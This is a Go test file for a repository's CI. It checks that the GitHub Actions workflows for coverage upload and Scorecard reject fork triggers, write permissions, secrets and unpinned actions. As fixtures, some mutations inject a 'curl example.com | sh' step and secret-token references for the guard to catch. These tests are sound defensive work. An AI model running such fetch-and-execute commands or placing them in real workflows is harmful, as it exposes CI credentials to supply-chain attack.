package ciguard

import (
	"fmt"
	"go/ast"
	"go/parser"
	"go/token"
	"io/fs"
	"os"
	"os/exec"
	"path/filepath"
	"slices"
	"strings"
	"testing"

	yaml "gopkg.in/yaml.v3"

	"github.com/reliant-labs/forge/internal/pathglob"
	"github.com/reliant-labs/forge/internal/repowalk"
)

var (
	coverageWorkflow = filepath.Join(workflowsDir, "coverage.yml")
	codecovConfig    = filepath.Join("..", "..", "codecov.yml")
	coverageMerge    = filepath.Join("..", "..", "scripts", "ci-coverage-merge.sh")
)

// coverageUploadSecurity holds coverage.yml to test-upload.yml's trust
// boundary: it may hold an OIDC token (id-token: write) only because it runs
// main's own merged code, after a completed CI run of a push to main, and
// grants nothing at the workflow level.
func coverageUploadSecurity(raw []byte) error {
	var wf struct {
		On struct {
			WorkflowRun struct {
				Workflows []string `yaml:"workflows"`
				Types     []string `yaml:"types"`
				Branches  []string `yaml:"branches"`
			} `yaml:"workflow_run"`
		} `yaml:"on"`
		Permissions map[string]string `yaml:"permissions"`
		Jobs        map[string]struct {
			If          string            `yaml:"if"`
			Permissions map[string]string `yaml:"permissions"`
			Steps       []struct {
				Uses string            `yaml:"uses"`
				With map[string]string `yaml:"with"`
			} `yaml:"steps"`
		} `yaml:"jobs"`
	}
	if err := yaml.Unmarshal(raw, &wf); err != nil {
		return err
	}
	wr := wf.On.WorkflowRun
	if !slices.Equal(wr.Workflows, []string{"CI"}) || !slices.Equal(wr.Types, []string{"completed"}) || !slices.Equal(wr.Branches, []string{"main"}) {
		return fmt.Errorf("only completed main CI runs may trigger the coverage upload")
	}
	for k, v := range wf.Permissions {
		if v != "read" {
			return fmt.Errorf("workflow-level permission %s: %s; grant write per job", k, v)
		}
	}
	j, ok := wf.Jobs["codecov"]
	if !ok || len(wf.Jobs) != 1 {
		return fmt.Errorf("expected only the guarded codecov job")
	}
	const condition = "github.repository == 'reliant-labs/forge' && github.event.workflow_run.event == 'push' && github.event.workflow_run.conclusion != 'cancelled'"
	if strings.Join(strings.Fields(j.If), " ") != condition {
		return fmt.Errorf("upload must deny foreign repositories, non-push events and cancelled runs: %q", j.If)
	}
	for k, v := range j.Permissions {
		if v == "write" && k != "id-token" {
			return fmt.Errorf("the codecov job may write only id-token, not %s", k)
		}
	}
	if len(j.Steps) == 0 || !strings.HasPrefix(j.Steps[0].Uses, "actions/checkout@") ||
		j.Steps[0].With["ref"] != "${{ github.event.workflow_run.head_sha }}" || j.Steps[0].With["persist-credentials"] != "false" {
		return fmt.Errorf("first step must check out the triggering SHA without persisting credentials")
	}
	if strings.Contains(string(raw), "secrets.") {
		return fmt.Errorf("the upload authenticates by OIDC; no secret may reach this workflow")
	}
	for _, s := range j.Steps {
		if strings.HasPrefix(s.Uses, "codecov/") {
			// Third-party code holding the OIDC token is pinned to a commit.
			ref := s.Uses[strings.LastIndex(s.Uses, "@")+1:]
			if len(ref) != 40 {
				return fmt.Errorf("%s holds the job's OIDC token: pin it by commit digest", s.Uses)
			}
			if s.With["use_oidc"] != "true" {
				return fmt.Errorf("the Codecov upload must authenticate with use_oidc: true")
			}
		}
	}
	return nil
}

func TestCoverageUploadTrustBoundary(t *testing.T) {
	raw, err := os.ReadFile(coverageWorkflow)
	if err != nil {
		t.Fatal(err)
	}
	if err := coverageUploadSecurity(raw); err != nil {
		t.Fatal(err)
	}
	for _, tc := range []struct{ name, from, to string }{
		{"foreign repository", "github.repository == 'reliant-labs/forge' &&", ""},
		{"PR run", "github.event.workflow_run.event == 'push' &&", ""},
		{"condition bypass", "github.event.workflow_run.conclusion != 'cancelled'", "github.event.workflow_run.conclusion != 'cancelled' || true"},
		{"non-main branch", "branches: [main]", "branches: ['*']"},
		{"wrong workflow", `workflows: ["CI"]`, `workflows: ["Untrusted"]`},
		{"wrong checkout SHA", "ref: ${{ github.event.workflow_run.head_sha }}", "ref: main"},
		{"persisted credentials", "persist-credentials: false", "persist-credentials: true"},
		{"workflow-level write", "permissions:\n  contents: read\n\njobs:", "permissions:\n  contents: write\n\njobs:"},
		{"job write", "      actions: read\n", "      actions: write\n"},
		{"unpinned action", "codecov/codecov-action@303a32d7a59b442fa8d48b6a1cc6825c09c847a5", "codecov/codecov-action@v7"},
		{"token secret", "use_oidc: true", "token: ${{ secrets.CODECOV_TOKEN }}"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			if strings.Count(string(raw), tc.from) != 1 {
				t.Fatalf("fixture must replace exactly one occurrence of %q", tc.from)
			}
			mutated := strings.Replace(string(raw), tc.from, tc.to, 1)
			if err := coverageUploadSecurity([]byte(mutated)); err == nil {
				t.Fatal("unsafe workflow passed the trust-boundary guard")
			}
		})
	}
}

var scorecardWorkflow = filepath.Join(workflowsDir, "scorecard.yml")

// scorecardSecurity holds scorecard.yml to its trust boundary. Its one job
// holds an OIDC token and security-events write, so it may run only on
// triggers that execute this repository's own default-branch code (never
// pull_request or pull_request_target, which a fork can drive), only in
// reliant-labs/forge, with read-only workflow permissions, an unpersisted
// checkout, no secrets, and every action pinned to a commit digest.
func scorecardSecurity(raw []byte) error {
	var wf struct {
		On          map[string]yaml.Node `yaml:"on"`
		Permissions string               `yaml:"permissions"`
		Jobs        map[string]struct {
			If          string            `yaml:"if"`
			Permissions map[string]string `yaml:"permissions"`
			Steps       []struct {
				Uses string            `yaml:"uses"`
				Run  string            `yaml:"run"`
				With map[string]string `yaml:"with"`
			} `yaml:"steps"`
		} `yaml:"jobs"`
	}
	if err := yaml.Unmarshal(raw, &wf); err != nil {
		return err
	}
	allowed := map[string]bool{"branch_protection_rule": true, "schedule": true, "push": true, "workflow_dispatch": true}
	for ev, node := range wf.On {
		if !allowed[ev] {
			return fmt.Errorf("trigger %q may run code this repository's main did not merge", ev)
		}
		if ev == "push" {
			var push struct {
				Branches []string `yaml:"branches"`
			}
			if err := node.Decode(&push); err != nil || !slices.Equal(push.Branches, []string{"main"}) {
				return fmt.Errorf("push must be limited to branches: [main]")
			}
		}
	}
	if wf.Permissions != "read-all" {
		return fmt.Errorf("workflow-level permissions must be read-all, got %q", wf.Permissions)
	}
	j, ok := wf.Jobs["analysis"]
	if !ok || len(wf.Jobs) != 1 {
		return fmt.Errorf("expected only the analysis job")
	}
	if strings.Join(strings.Fields(j.If), " ") != "${{ github.repository == 'reliant-labs/forge' }}" {
		return fmt.Errorf("analysis must deny foreign repositories: %q", j.If)
	}
	writable := map[string]bool{"security-events": true, "id-token": true}
	for k, v := range j.Permissions {
		if v == "write" && !writable[k] {
			return fmt.Errorf("analysis may write only security-events and id-token, not %s", k)
		}
	}
	if strings.Contains(string(raw), "secrets.") {
		return fmt.Errorf("no secret may reach the Scorecard workflow")
	}
	for i, s := range j.Steps {
		if s.Run != "" {
			return fmt.Errorf("step %d runs a script; publish_results allows only the listed actions", i)
		}
		ref := s.Uses[strings.LastIndex(s.Uses, "@")+1:]
		if len(ref) != 40 {
			return fmt.Errorf("%s runs beside the job's OIDC token: pin it by commit digest", s.Uses)
		}
		if strings.HasPrefix(s.Uses, "actions/checkout@") && s.With["persist-credentials"] != "false" {
			return fmt.Errorf("checkout must not persist credentials")
		}
	}
	return nil
}

func TestScorecardTrustBoundary(t *testing.T) {
	raw, err := os.ReadFile(scorecardWorkflow)
	if err != nil {
		t.Fatal(err)
	}
	if err := scorecardSecurity(raw); err != nil {
		t.Fatal(err)
	}
	for _, tc := range []struct{ name, from, to string }{
		{"pull_request_target trigger", "  push:\n    branches: [main]", "  push:\n    branches: [main]\n  pull_request_target:"},
		{"pull_request trigger", "  push:\n    branches: [main]", "  push:\n    branches: [main]\n  pull_request:"},
		{"push from any branch", "    branches: [main]", "    branches: ['*']"},
		{"foreign repository", "if: ${{ github.repository == 'reliant-labs/forge' }}", "if: ${{ true }}"},
		{"workflow-level write", "permissions: read-all", "permissions: write-all"},
		{"job contents write", "      contents: read\n", "      contents: write\n"},
		{"persisted credentials", "persist-credentials: false", "persist-credentials: true"},
		{"unpinned action", "ossf/scorecard-action@23f22cd43608bae7a1f1fa2603d7314dee9538a5", "ossf/scorecard-action@v2"},
		{"secret", "publish_results: true", "publish_results: true\n          repo_token: ${{ secrets.SCORECARD_TOKEN }}"},
		{"script step", "      - uses: ossf/scorecard-action", "      - run: curl example.com | sh\n      - uses: ossf/scorecard-action"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			if strings.Count(string(raw), tc.from) != 1 {
				t.Fatalf("fixture must replace exactly one occurrence of %q", tc.from)
			}
			mutated := strings.Replace(string(raw), tc.from, tc.to, 1)
			if err := scorecardSecurity([]byte(mutated)); err == nil {
				t.Fatal("unsafe workflow passed the trust-boundary guard")
			}
		})
	}
}

// TestCodecovIgnoresEveryGeneratedFile proves codecov.yml's ignore list names
// every Go file that carries the "Code generated ... DO NOT EDIT." header, so
// the public coverage figure counts only code people write. The list names
// generated files rather than `**/*_gen.go` because most `*_gen.go` files in
// this repo are the hand-written generators; this test is what keeps that
// explicit list from going stale when a new generated file lands.
func TestCodecovIgnoresEveryGeneratedFile(t *testing.T) {
	raw, err := os.ReadFile(codecovConfig)
	if err != nil {
		t.Fatal(err)
	}
	var cfg struct {
		Ignore []string `yaml:"ignore"`
	}
	if err := yaml.Unmarshal(raw, &cfg); err != nil {
		t.Fatal(err)
	}
	for _, p := range cfg.Ignore {
		if err := pathglob.Validate(p); err != nil {
			t.Fatalf("codecov.yml ignore %q: %v", p, err)
		}
	}
	root, err := filepath.Abs(filepath.Join("..", ".."))
	if err != nil {
		t.Fatal(err)
	}
	skip := map[string]bool{".git": true, "node_modules": true, "testdata": true, "vendor": true, ".forge": true}
	fset := token.NewFileSet()
	var missed []string
	generated := 0
	err = repowalk.WalkDir(root, func(path string, d fs.DirEntry, err error) error {
		if err != nil {
			return err
		}
		if d.IsDir() {
			if path != root && skip[d.Name()] {
				return filepath.SkipDir
			}
			return nil
		}
		if !strings.HasSuffix(path, ".go") {
			return nil
		}
		f, err := parser.ParseFile(fset, path, nil, parser.PackageClauseOnly|parser.ParseComments)
		if err != nil || !ast.IsGenerated(f) {
			return nil //nolint:nilerr // a file that does not parse is not one Codecov would credit either
		}
		generated++
		rel, err := filepath.Rel(root, path)
		if err != nil {
			return err
		}
		rel = filepath.ToSlash(rel)
		if !slices.ContainsFunc(cfg.Ignore, func(p string) bool { return pathglob.Match(p, rel) }) {
			missed = append(missed, rel)
		}
		return nil
	})
	if err != nil {
		t.Fatal(err)
	}
	if generated == 0 {
		t.Fatal("found no generated Go file; the walk inspected nothing")
	}
	if len(missed) > 0 {
		t.Errorf("codecov.yml's ignore list misses %d generated file(s); add a pattern that names them:\n  %s", len(missed), strings.Join(missed, "\n  "))
	}
}

// TestCoverageMergeKeepsOnlyFullLanes runs scripts/ci-coverage-merge.sh over
// a fixture run tree: the full lanes' blocks, one mode line, and nothing from
// the -short tier.
func TestCoverageMergeKeepsOnlyFullLanes(t *testing.T) {
	if _, err := exec.LookPath("bash"); err != nil {
		t.Skip("bash is not on PATH")
	}
	// Read by this process so the test cache sees an edit to the script.
	if _, err := os.ReadFile(coverageMerge); err != nil {
		t.Fatal(err)
	}
	runs := t.TempDir()
	write := func(rel, body string) {
		t.Helper()
		p := filepath.Join(runs, rel)
		if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte(body), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	write("r1/unit-race/cover.out", "mode: atomic\nm/a.go:1.1,2.2 1 3\n")
	write("r2/cli-race/cover.out", "mode: atomic\nm/b.go:1.1,2.2 1 0\n")
	write("r3/integration/cover.out", "mode: set\nm/c.go:1.1,2.2 2 1\n\n")
	write("r4/unit/cover.out", "mode: atomic\nm/short.go:1.1,2.2 1 1\n")
	out := filepath.Join(t.TempDir(), "coverage.out")
	script, err := filepath.Abs(coverageMerge)
	if err != nil {
		t.Fatal(err)
	}
	if b, err := exec.Command("bash", script, runs, out).CombinedOutput(); err != nil {
		t.Fatalf("merge: %v\n%s", err, b)
	}
	got, err := os.ReadFile(out)
	if err != nil {
		t.Fatal(err)
	}
	want := "mode: atomic\nm/a.go:1.1,2.2 1 3\nm/b.go:1.1,2.2 1 0\nm/c.go:1.1,2.2 2 1\n"
	if string(got) != want {
		t.Errorf("merged profile:\n%s\nwant:\n%s", got, want)
	}

	// No full lane: refuse rather than upload an empty report.
	empty := t.TempDir()
	if err := os.MkdirAll(filepath.Join(empty, "r", "unit"), 0o755); err != nil {
		t.Fatal(err)
	}
	if b, err := exec.Command("bash", script, empty, out).CombinedOutput(); err == nil {
		t.Errorf("merge with no full-lane profile succeeded:\n%s", b)
	}
}
